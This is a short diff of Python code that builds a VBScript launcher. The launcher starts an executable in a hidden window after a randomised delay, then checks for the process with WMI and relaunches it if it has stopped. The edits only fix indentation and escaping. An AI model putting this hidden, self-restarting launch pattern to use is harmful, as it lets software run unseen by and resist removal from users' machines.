@@ -916,10 +916,10 @@ def _make_launcher(exe, folder):
         "WScript.Sleep 15000 + Int(Rnd() * 25000)",
         'sh.Run """" & exe & """", 0, False',
         "For i = 1 To 120",
-        "  WScript.Sleep 20000",
-        '  Set svc = GetObject("winmgmts:\\.\root\cimv2")',
-        f'  Set col = svc.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=\'{os.path.basename(exe)}\'")',
-        '  If col.Count = 0 Then sh.Run """" & exe & """", 0, False',
+        "    WScript.Sleep 20000",
+        '    Set svc = GetObject("winmgmts:\\\\.\\root\\cimv2")',
+        f'    Set col = svc.ExecQuery("SELECT Name FROM Win32_Process WHERE Name=\'{os.path.basename(exe)}\'")',
+        '    If col.Count = 0 Then sh.Run """" & exe & """", 0, False',
         "Next",
     ]
     path = os.path.join(os.path.dirname(exe), folder + ".vbs")
@@ -930,7 +930,6 @@ def _make_launcher(exe, folder):
         return path
     except Exception:
         return None
-
 
 def _hidden_cmd(exe):
     try:
